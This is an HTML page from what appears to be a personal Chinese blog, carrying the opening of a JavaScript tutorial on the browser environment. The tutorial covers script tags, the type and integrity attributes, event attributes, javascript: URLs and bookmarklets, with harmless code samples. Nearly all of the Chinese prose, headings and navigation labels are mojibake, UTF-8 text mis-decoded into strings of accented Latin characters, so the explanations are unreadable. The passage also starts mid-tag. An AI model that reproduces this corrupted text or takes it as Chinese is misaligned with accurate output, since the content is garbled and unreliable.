class="toc-item toc-level-4"><a class="toc-link" href="#å…³é—­-Worker"><span class="toc-number">15.2.5.</span> <span class="toc-text">å…³é—­ Worker</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#æ•°æ®é€šä¿¡"><span class="toc-number">15.3.</span> <span class="toc-text">æ•°æ®é€šä¿¡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#åŒé¡µé¢çš„-Web-Worker"><span class="toc-number">15.4.</span> <span class="toc-text">åŒé¡µé¢çš„ Web Worker</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#å®ä¾‹ï¼šWorker-çº¿ç¨‹å®Œæˆè½®è¯¢"><span class="toc-number">15.5.</span> <span class="toc-text">å®ä¾‹ï¼šWorker çº¿ç¨‹å®Œæˆè½®è¯¢</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#å®ä¾‹ï¼š-Worker-æ–°å»º-Worker"><span class="toc-number">15.6.</span> <span class="toc-text">å®ä¾‹ï¼š Worker æ–°å»º Worker</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#API"><span class="toc-number">15.7.</span> <span class="toc-text">API</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ä¸»çº¿ç¨‹-1"><span class="toc-number">15.7.1.</span> <span class="toc-text">ä¸»çº¿ç¨‹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Worker-çº¿ç¨‹-1"><span class="toc-number">15.7.2.</span> <span class="toc-text">Worker çº¿ç¨‹</span></a></li></ol></li></ol></li></ol></div></div></div><div id="body-wrap"><div class="post-bg" id="nav" style="background-image: url(https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=1273994899,2704080463&amp;fm=26&amp;gp=0.jpg)"><div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">å‘é˜³æ¦†æœ¨</a></span><span class="pull_right menus"><div id="search_button"><a class="site-page social-icon search"><i class="fa fa-search fa-fw"></i><span> æœç´¢</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/random/"><i class="fa-fw fa fa-random"></i><span> éšæœºæ–‡ç« </span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-th-large" aria-hidden="true"></i><span> å½’æ¡£</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> æ—¶é—´è½´</span></a></li><li><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> æ ‡ç­¾</span></a></li><li><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> åˆ†ç±»</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/tagsnet/"><i class="fa-fw fa fa-connectdevelop"></i><span> å…³ç³»ç½‘</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-send-o" aria-hidden="true"></i><span> å¯¼èˆªæ </span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="https://xyyum.icu/mypages/OnlyI.html" target="_blank" rel="noopener"><i class="fa-fw fa fa-send"></i><span> ä¸»é¡µå¯¼èˆª</span></a></li><li><a class="site-page" href="https://xyyum.icu/mypages/xkzhdh/Integrated.html" target="_blank" rel="noopener"><i class="fa-fw fa fa-paper-plane-o"></i><span> ç»¼åˆå¯¼èˆª</span></a></li><li><a class="site-page" href="https://xyyum.icu/mypages/software/index.html" target="_blank" rel="noopener"><i class="fa-fw fa fa-send"></i><span> è½¯ä»¶åˆ†äº«</span></a></li><li><a class="site-page" href="/sunshineBookshelf/"><i class="fa-fw fa fa-university"></i><span> å‘é˜³ä¹¦æ¶</span></a></li></ul></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> åˆ—è¡¨</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/books/"><i class="fa-fw fa fa-book"></i><span> ä¹¦ç±</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> ç”µå½±</span></a></li><li><a class="site-page" href="/games/"><i class="fa-fw fa fa-gamepad"></i><span> æ¸¸æˆ</span></a></li><li><a class="site-page" href="/bilibili/"><i class="fa-fw fa fa-play-circle"></i><span> ç•ªå‰§</span></a></li><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> éŸ³ä¹</span></a></li><li><a class="site-page" href="/movie/"><i class="fa-fw fa fa-play-circle-o"></i><span> å½±è§†</span></a></li></ul></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-link" aria-hidden="true"></i><span> å‹æƒ…é“¾æ¥</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> å‹æƒ…é“¾æ¥</span></a></li><li><a class="site-page" href="https://yumuxy.gitee.io/" target="_blank" rel="noopener"><i class="fa-fw fa fa-link"></i><span> æ¡‘æ¦†æœªæ™š</span></a></li><li><a class="site-page" href="https://lllzxqq.gitee.io/" target="_blank" rel="noopener"><i class="fa-fw fa fa-link"></i><span> ååğŸ’–é›¨å­£</span></a></li></ul></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-user-circle-o" aria-hidden="true"></i><span> å…³äºæˆ‘</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="http://www.xbmu.edu.cn/" target="_blank" rel="noopener"><i class="fa-fw fa fa-graduation-cap"></i><span> æ¯æ ¡</span></a></li><li><a class="site-page" href="/workshop/"><i class="fa-fw fa fa-heartbeat"></i><span> ä½œå“</span></a></li><li><a class="site-page" href="/mybook/"><i class="fa-fw fa fa-book"></i><span> è‡ªä¼ </span></a></li><li><a class="site-page" href="/anires/"><i class="fa-fw fa fa-list-alt"></i><span> ç®€å†</span></a></li><li><a class="site-page" href="/vcard/"><i class="fa-fw fa fa-vcard-o"></i><span> åç‰‡</span></a></li></ul></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-gamepad" aria-hidden="true"></i><span> å¨±ä¹</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="https://playground.z.wiki/typing-game/index.html" target="_blank" rel="noopener"><i class="fa-fw fa fa-gamepad"></i><span> æ‰“å­—æ¸¸æˆ</span></a></li><li><a class="site-page" href="https://xyyum.icu/mypages/GreedySnake/GreedySnake.html" target="_blank" rel="noopener"><i class="fa-fw fa fa-lastfm"></i><span> è´ªåƒè›‡</span></a></li><li><a class="site-page" href="https://xyyum.icu/mypages/nineGridGame/nineGridGame.html" target="_blank" rel="noopener"><i class="fa-fw fa fa-gamepad"></i><span> æŠ½å¥–æ¸¸æˆ</span></a></li><li><a class="site-page" href="/petalage/"><i class="fa-fw fa fa-gamepad"></i><span> è¡¨ç™½æ—¶åˆ»</span></a></li><li><a class="site-page" href="/yszq/"><i class="fa-fw fa fa-gamepad"></i><span> 3Då…ƒç´ </span></a></li></ul></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-gear (alias)" aria-hidden="true"></i><span> å·¥å…·å¹³å°</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/xkdm/"><i class="fa-fw fa fa-star"></i><span> æ˜Ÿç©ºå¼¹å¹•</span></a></li><li><a class="site-page" href="https://xyym.avosapps.us/" target="_blank" rel="noopener"><i class="fa-fw fa fa-commenting-o"></i><span> è¯„è®ºç®¡ç†</span></a></li><li><a class="site-page" href="https://myhkw.cn/admin/user/login/" target="_blank" rel="noopener"><i class="fa-fw fa fa-music"></i><span> éŸ³ä¹åå°</span></a></li><li><a class="site-page" href="https://www.superbed.cn/" target="_blank" rel="noopener"><i class="fa-fw fa fa-area-chart"></i><span> èšåˆå›¾åºŠ</span></a></li><li><a class="site-page" href="/encryptedPages/"><i class="fa-fw fa fa-lock"></i><span> åŠ å¯†è®¿é—®</span></a></li></ul></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-heartbeat" aria-hidden="true"></i><span> çºªå¿µç©ºé—´</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/3d-gallery/"><i class="fa-fw fa fa-university"></i><span> 3Dç›¸å†Œå±‹</span></a></li><li><a class="site-page" href="/live-photo/"><i class="fa-fw fa fa-photo"></i><span> é’æ˜¥æ ¡å›­</span></a></li><li><a class="site-page" href="/photo-wall/"><i class="fa-fw fa fa-th"></i><span> ç”Ÿæ´»ç…§ç‰‡</span></a></li><li><a class="site-page" href="/video-wall/"><i class="fa-fw fa fa-video-camera"></i><span> åœ¨çº¿è§†é¢‘</span></a></li><li><a class="site-page" href="/mtxx/"><i class="fa-fw fa fa-file-photo-o"></i><span> ç¾å›¾ç§€ç§€</span></a></li><li><a class="site-page" href="/timeStoryline/"><i class="fa-fw fa fa-file-video-o"></i><span> æ—¶é—´æ•…äº‹çº¿</span></a></li></ul></div></div><span class="toggle-menu close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span></span></div><div id="post-info"><div id="post-title"><div class="posttitle">â‘¦JavaScriptæ•™ç¨‹ä¹‹æµè§ˆå™¨æ¨¡å‹</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="å‘è¡¨äº 2021-10-17 21:15:00"><i class="fa fa-calendar" aria-hidden="true"></i> å‘è¡¨äº 2021-10-17</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="æ›´æ–°äº 2024-12-21 18:14:09"><i class="fa fa-history" aria-hidden="true"></i> æ›´æ–°äº 2024-12-21</span></time><span class="post-meta__categories"><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/">å‰ç«¯æŠ€æœ¯</a></span></div><div class="meta-secondline"> </div><div class="meta-thirdline"><span class="post-meta-pv-cv"><i class="fa fa-eye post-meta__icon" aria-hidden="true"> </i><span>é˜…è¯»é‡:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-commentcount"><span class="post-meta__separator">|</span><i class="post-meta__icon fa fa-comment-o" aria-hidden="true"></i><span>è¯„è®ºæ•°:</span><a href="/2021/10/17/JavaScript%E6%95%99%E7%A8%8B%E4%B9%8B%E6%B5%8F%E8%A7%88%E5%99%A8%E6%A8%A1%E5%9E%8B/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count comment-count" data-xid="/2021/10/17/JavaScript%E6%95%99%E7%A8%8B%E4%B9%8B%E6%B5%8F%E8%A7%88%E5%99%A8%E6%A8%A1%E5%9E%8B/" itemprop="commentCount"></span></a></span></div></div></div></div><main class="layout_post" id="content-inner"><article id="post"><div id="article-container"><h2 id="æµè§ˆå™¨ç¯å¢ƒæ¦‚è¿°"><a href="#æµè§ˆå™¨ç¯å¢ƒæ¦‚è¿°" class="headerlink" title="æµè§ˆå™¨ç¯å¢ƒæ¦‚è¿°"></a>æµè§ˆå™¨ç¯å¢ƒæ¦‚è¿°</h2><p>JavaScript æ˜¯æµè§ˆå™¨çš„å†…ç½®è„šæœ¬è¯­è¨€ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæµè§ˆå™¨å†…ç½®äº† JavaScript å¼•æ“ï¼Œå¹¶ä¸”æä¾›å„ç§æ¥å£ï¼Œè®© JavaScript è„šæœ¬å¯ä»¥æ§åˆ¶æµè§ˆå™¨çš„å„ç§åŠŸèƒ½ã€‚ä¸€æ—¦ç½‘é¡µå†…åµŒäº† JavaScript è„šæœ¬ï¼Œæµè§ˆå™¨åŠ è½½ç½‘é¡µï¼Œå°±ä¼šå»æ‰§è¡Œè„šæœ¬ï¼Œä»è€Œè¾¾åˆ°æ“ä½œæµè§ˆå™¨çš„ç›®çš„ï¼Œå®ç°ç½‘é¡µçš„å„ç§åŠ¨æ€æ•ˆæœã€‚</p>
<p>æœ¬ç« å¼€å§‹ä»‹ç»æµè§ˆå™¨æä¾›çš„å„ç§ JavaScript æ¥å£ã€‚é¦–å…ˆï¼Œä»‹ç» JavaScript ä»£ç åµŒå…¥ç½‘é¡µçš„æ–¹æ³•ã€‚</p>
<h3 id="ä»£ç åµŒå…¥ç½‘é¡µçš„æ–¹æ³•"><a href="#ä»£ç åµŒå…¥ç½‘é¡µçš„æ–¹æ³•" class="headerlink" title="ä»£ç åµŒå…¥ç½‘é¡µçš„æ–¹æ³•"></a>ä»£ç åµŒå…¥ç½‘é¡µçš„æ–¹æ³•</h3><p>ç½‘é¡µä¸­åµŒå…¥ JavaScript ä»£ç ï¼Œä¸»è¦æœ‰å››ç§æ–¹æ³•ã€‚</p>
<ul>
<li><code>&lt; script&gt;</code>å…ƒç´ ç›´æ¥åµŒå…¥ä»£ç ã€‚</li>
<li><code>&lt; script&gt;</code>æ ‡ç­¾åŠ è½½å¤–éƒ¨è„šæœ¬</li>
<li>äº‹ä»¶å±æ€§</li>
<li>URL åè®®</li>
</ul>
<h4 id="script-å…ƒç´ åµŒå…¥ä»£ç "><a href="#script-å…ƒç´ åµŒå…¥ä»£ç " class="headerlink" title="script å…ƒç´ åµŒå…¥ä»£ç "></a>script å…ƒç´ åµŒå…¥ä»£ç </h4><p>&lt; script &gt;å…ƒç´ å†…éƒ¨å¯ä»¥ç›´æ¥å†™å…¥ JavaScript ä»£ç ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  var x &#x3D; 1 + 5;</span><br><span class="line">  console.log(x);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>&lt; script&gt;æ ‡ç­¾æœ‰ä¸€ä¸ªtypeå±æ€§ï¼Œç”¨æ¥æŒ‡å®šè„šæœ¬ç±»å‹ã€‚å¯¹ JavaScript è„šæœ¬æ¥è¯´ï¼Œtypeå±æ€§å¯ä»¥è®¾ä¸ºä¸¤ç§å€¼ã€‚</p>
<ul>
<li><code>text/javascript</code>ï¼šè¿™æ˜¯é»˜è®¤å€¼ï¼Œä¹Ÿæ˜¯å†å²ä¸Šä¸€è´¯è®¾å®šçš„å€¼ã€‚å¦‚æœä½ çœç•¥<code>type</code>å±æ€§ï¼Œé»˜è®¤å°±æ˜¯è¿™ä¸ªå€¼ã€‚å¯¹äºè€å¼æµè§ˆå™¨ï¼Œè®¾ä¸ºè¿™ä¸ªå€¼æ¯”è¾ƒå¥½ã€‚</li>
<li><code>application/javascript</code>ï¼šå¯¹äºè¾ƒæ–°çš„æµè§ˆå™¨ï¼Œå»ºè®®è®¾ä¸ºè¿™ä¸ªå€¼ã€‚</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type&#x3D;&quot;application&#x2F;javascript&quot;&gt;</span><br><span class="line">  console.log(&#39;Hello World&#39;);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>ç”±äº<code>&lt; script&gt;</code>æ ‡ç­¾é»˜è®¤å°±æ˜¯ JavaScript ä»£ç ã€‚æ‰€ä»¥ï¼ŒåµŒå…¥ JavaScript è„šæœ¬æ—¶ï¼Œ<code>type</code>å±æ€§å¯ä»¥çœç•¥ã€‚</p>
<p>å¦‚æœ<code>type</code>å±æ€§çš„å€¼ï¼Œæµè§ˆå™¨ä¸è®¤è¯†ï¼Œé‚£ä¹ˆå®ƒä¸ä¼šæ‰§è¡Œå…¶ä¸­çš„ä»£ç ã€‚åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œå¯ä»¥åœ¨<code>&lt; script&gt;</code>æ ‡ç­¾ä¹‹ä¸­åµŒå…¥ä»»æ„çš„æ–‡æœ¬å†…å®¹ï¼Œåªè¦åŠ ä¸Šä¸€ä¸ªæµè§ˆå™¨ä¸è®¤è¯†çš„<code>type</code>å±æ€§å³å¯ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script id&#x3D;&quot;mydata&quot; type&#x3D;&quot;x-custom-data&quot;&gt;</span><br><span class="line">  console.log(&#39;Hello World&#39;);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢çš„ä»£ç ï¼Œæµè§ˆå™¨ä¸ä¼šæ‰§è¡Œï¼Œä¹Ÿä¸ä¼šæ˜¾ç¤ºå®ƒçš„å†…å®¹ï¼Œå› ä¸ºä¸è®¤è¯†å®ƒçš„<code>type</code>å±æ€§ã€‚ä½†æ˜¯ï¼Œè¿™ä¸ª<code>&lt; script&gt;</code>èŠ‚ç‚¹ä¾ç„¶å­˜åœ¨äº DOM ä¹‹ä¸­ï¼Œå¯ä»¥ä½¿ç”¨<code>&lt; script&gt;</code>èŠ‚ç‚¹çš„<code>text</code>å±æ€§è¯»å‡ºå®ƒçš„å†…å®¹ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById(&#39;mydata&#39;).text</span><br><span class="line">&#x2F;&#x2F;   console.log(&#39;Hello World&#39;);</span><br></pre></td></tr></table></figure>

<h4 id="script-å…ƒç´ åŠ è½½å¤–éƒ¨è„šæœ¬"><a href="#script-å…ƒç´ åŠ è½½å¤–éƒ¨è„šæœ¬" class="headerlink" title="script å…ƒç´ åŠ è½½å¤–éƒ¨è„šæœ¬"></a>script å…ƒç´ åŠ è½½å¤–éƒ¨è„šæœ¬</h4><p>&lt; script&gt;æ ‡ç­¾ä¹Ÿå¯ä»¥æŒ‡å®šåŠ è½½å¤–éƒ¨çš„è„šæœ¬æ–‡ä»¶ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;www.example.com&#x2F;script.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœè„šæœ¬æ–‡ä»¶ä½¿ç”¨äº†éè‹±è¯­å­—ç¬¦ï¼Œè¿˜åº”è¯¥æ³¨æ˜å­—ç¬¦çš„ç¼–ç ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script charset&#x3D;&quot;utf-8&quot; src&#x3D;&quot;https:&#x2F;&#x2F;www.example.com&#x2F;script.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>æ‰€åŠ è½½çš„è„šæœ¬å¿…é¡»æ˜¯çº¯çš„ JavaScript ä»£ç ï¼Œä¸èƒ½æœ‰<code>HTML</code>ä»£ç å’Œ<code>&lt;script&gt;</code>æ ‡ç­¾ã€‚</p>
<p>åŠ è½½å¤–éƒ¨è„šæœ¬å’Œç›´æ¥æ·»åŠ ä»£ç å—ï¼Œè¿™ä¸¤ç§æ–¹æ³•ä¸èƒ½æ··ç”¨ã€‚ä¸‹é¢ä»£ç çš„<code>console.log</code>è¯­å¥ç›´æ¥è¢«å¿½ç•¥ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script charset&#x3D;&quot;utf-8&quot; src&#x3D;&quot;example.js&quot;&gt;</span><br><span class="line">  console.log(&#39;Hello World!&#39;);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>ä¸ºäº†é˜²æ­¢æ”»å‡»è€…ç¯¡æ”¹å¤–éƒ¨è„šæœ¬ï¼Œ<code>script</code>æ ‡ç­¾å…è®¸è®¾ç½®ä¸€ä¸ª<code>integrity</code>å±æ€§ï¼Œå†™å…¥è¯¥å¤–éƒ¨è„šæœ¬çš„ Hash ç­¾åï¼Œç”¨æ¥éªŒè¯è„šæœ¬çš„ä¸€è‡´æ€§ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;&#x2F;assets&#x2F;application.js&quot;</span><br><span class="line">  integrity&#x3D;&quot;sha256-TvVUHzSfftWg1rcfL6TIJ0XKEGrgLyEq6lEpcmrG9qs&#x3D;&quot;&gt;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>script</code>æ ‡ç­¾æœ‰ä¸€ä¸ª<code>integrity</code>å±æ€§ï¼ŒæŒ‡å®šäº†å¤–éƒ¨è„šæœ¬<code>/assets/application.js</code>çš„ SHA256 ç­¾åã€‚ä¸€æ—¦æœ‰äººæ”¹äº†è¿™ä¸ªè„šæœ¬ï¼Œå¯¼è‡´ SHA256 ç­¾åä¸åŒ¹é…ï¼Œæµè§ˆå™¨å°±ä¼šæ‹’ç»åŠ è½½ã€‚</p>
<h4 id="äº‹ä»¶å±æ€§"><a href="#äº‹ä»¶å±æ€§" class="headerlink" title="äº‹ä»¶å±æ€§"></a>äº‹ä»¶å±æ€§</h4><p>ç½‘é¡µå…ƒç´ çš„äº‹ä»¶å±æ€§ï¼ˆæ¯”å¦‚<code>onclick</code>å’Œ<code>onmouseover</code>ï¼‰ï¼Œå¯ä»¥å†™å…¥ JavaScript ä»£ç ã€‚å½“æŒ‡å®šäº‹ä»¶å‘ç”Ÿæ—¶ï¼Œå°±ä¼šè°ƒç”¨è¿™äº›ä»£ç ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button id&#x3D;&quot;myBtn&quot; onclick&#x3D;&quot;console.log(this.id)&quot;&gt;ç‚¹å‡»&lt;&#x2F;button&gt;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢çš„äº‹ä»¶å±æ€§ä»£ç åªæœ‰ä¸€ä¸ªè¯­å¥ã€‚å¦‚æœæœ‰å¤šä¸ªè¯­å¥ï¼Œä½¿ç”¨åˆ†å·åˆ†éš”å³å¯ã€‚</p>
<h4 id="URL-åè®®"><a href="#URL-åè®®" class="headerlink" title="URL åè®®"></a>URL åè®®</h4><p>URL æ”¯æŒ<code>javascript:</code>åè®®ï¼Œå³åœ¨ URL çš„ä½ç½®å†™å…¥ä»£ç ï¼Œä½¿ç”¨è¿™ä¸ª URL çš„æ—¶å€™å°±ä¼šæ‰§è¡Œ JavaScript ä»£ç ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;javascript:console.log(&#39;Hello&#39;)&quot;&gt;ç‚¹å‡»&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<p>æµè§ˆå™¨çš„åœ°å€æ ä¹Ÿå¯ä»¥æ‰§è¡Œ<code>javascript:</code>åè®®ã€‚å°†<code>javascript:console.log(&#39;Hello&#39;)</code>æ”¾å…¥åœ°å€æ ï¼ŒæŒ‰å›è½¦é”®ä¹Ÿä¼šæ‰§è¡Œè¿™æ®µä»£ç ã€‚</p>
<p>å¦‚æœ JavaScript ä»£ç è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæµè§ˆå™¨å°±ä¼šæ–°å»ºä¸€ä¸ªæ–‡æ¡£ï¼Œå±•ç¤ºè¿™ä¸ªå­—ç¬¦ä¸²çš„å†…å®¹ï¼ŒåŸæœ‰æ–‡æ¡£çš„å†…å®¹éƒ½ä¼šæ¶ˆå¤±ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;javascript: new Date().toLocaleTimeString();&quot;&gt;ç‚¹å‡»&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œç”¨æˆ·ç‚¹å‡»é“¾æ¥ä»¥åï¼Œä¼šæ‰“å¼€ä¸€ä¸ªæ–°æ–‡æ¡£ï¼Œé‡Œé¢æœ‰å½“å‰æ—¶é—´ã€‚</p>
<p>å¦‚æœè¿”å›çš„ä¸æ˜¯å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆæµè§ˆå™¨ä¸ä¼šæ–°å»ºæ–‡æ¡£ï¼Œä¹Ÿä¸ä¼šè·³è½¬ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;javascript: console.log(new Date().toLocaleTimeString())&quot;&gt;ç‚¹å‡»&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œç”¨æˆ·ç‚¹å‡»é“¾æ¥åï¼Œç½‘é¡µä¸ä¼šè·³è½¬ï¼Œåªä¼šåœ¨æ§åˆ¶å°æ˜¾ç¤ºå½“å‰æ—¶é—´ã€‚</p>
<p><code>javascript:</code>åè®®çš„å¸¸è§ç”¨é€”æ˜¯ä¹¦ç­¾è„šæœ¬ Bookmarkletã€‚ç”±äºæµè§ˆå™¨çš„ä¹¦ç­¾ä¿å­˜çš„æ˜¯ä¸€ä¸ªç½‘å€ï¼Œæ‰€ä»¥<code>javascript:</code>ç½‘å€ä¹Ÿå¯ä»¥ä¿å­˜åœ¨é‡Œé¢ï¼Œç”¨æˆ·é€‰æ‹©è¿™ä¸ªä¹¦ç­¾çš„æ—¶å€™ï¼Œå°±ä¼šåœ¨å½“å‰é¡µé¢æ‰§è¡Œè¿™ä¸ªè„šæœ¬ã€‚ä¸ºäº†é˜²æ­¢ä¹¦ç­¾æ›¿æ¢æ‰å½“å‰æ–‡æ¡£ï¼Œå¯ä»¥åœ¨è„šæœ¬å‰åŠ ä¸Š<code>void</code>ï¼Œæˆ–è€…åœ¨è„šæœ¬æœ€ååŠ ä¸Š<code>void 0</code>ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;javascript: void new Date().toLocaleTimeString();&quot;&gt;ç‚¹å‡»&lt;&#x2F;a&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;javascript: new Date().toLocaleTimeString();void 0;&quot;&gt;ç‚¹å‡»&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢è¿™ä¸¤ç§å†™æ³•ï¼Œç‚¹å‡»é“¾æ¥åï¼Œæ‰§è¡Œä»£ç éƒ½ä¸ä¼šç½‘é¡µè·³è½¬ã€‚</p>
<h3 id="script-å…ƒç´ "><a href="#script-å…ƒç´ " class="headerlink" title="script å…ƒç´ "></a>script å…ƒç´ </h3><h4 id="å·¥ä½œåŸç†"><a href="#å·¥ä½œåŸç†" class="headerlink" title="å·¥ä½œåŸç†"></a>å·¥ä½œåŸç†</h4><p>æµè§ˆå™¨åŠ è½½ JavaScript è„šæœ¬ï¼Œä¸»è¦é€šè¿‡<code>&lt;script&gt;</code>å…ƒç´ å®Œæˆã€‚æ­£å¸¸çš„ç½‘é¡µåŠ è½½æµç¨‹æ˜¯è¿™æ ·çš„ã€‚</p>
<ol>
<li>æµè§ˆå™¨ä¸€è¾¹ä¸‹è½½ HTML ç½‘é¡µï¼Œä¸€è¾¹å¼€å§‹è§£æã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸ç­‰åˆ°ä¸‹è½½å®Œï¼Œå°±å¼€å§‹è§£æã€‚</li>
<li>è§£æè¿‡ç¨‹ä¸­ï¼Œæµè§ˆå™¨å‘ç°<code>&lt;script&gt;</code>å…ƒç´ ï¼Œå°±æš‚åœè§£æï¼ŒæŠŠç½‘é¡µæ¸²æŸ“çš„æ§åˆ¶æƒè½¬äº¤ç»™ JavaScript å¼•æ“ã€‚</li>
<li>å¦‚æœ<code>&lt;script&gt;</code>å…ƒç´ å¼•ç”¨äº†å¤–éƒ¨è„šæœ¬ï¼Œå°±ä¸‹è½½è¯¥è„šæœ¬å†æ‰§è¡Œï¼Œå¦åˆ™å°±ç›´æ¥æ‰§è¡Œä»£ç ã€‚</li>
<li>JavaScript å¼•æ“æ‰§è¡Œå®Œæ¯•ï¼Œæ§åˆ¶æƒäº¤è¿˜æ¸²æŸ“å¼•æ“ï¼Œæ¢å¤å¾€ä¸‹è§£æ HTML ç½‘é¡µã€‚</li>
</ol>
